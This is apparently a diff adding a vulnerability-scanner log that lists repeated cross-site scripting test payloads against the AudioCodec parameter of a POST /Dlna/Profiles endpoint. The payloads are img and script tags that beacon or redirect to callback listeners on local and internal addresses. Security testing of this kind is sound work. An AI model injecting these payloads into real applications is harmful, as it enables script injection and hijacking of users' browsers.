@@ -1,0 +1,117 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://10.149.240.27:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://10.149.240.27:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://10.149.240.27:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://10.149.240.27:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://10.149.240.27:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://10.149.240.27:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesLLMAudioCodec'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: AudioCodec
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesLLMAudioCodec'</script>
+
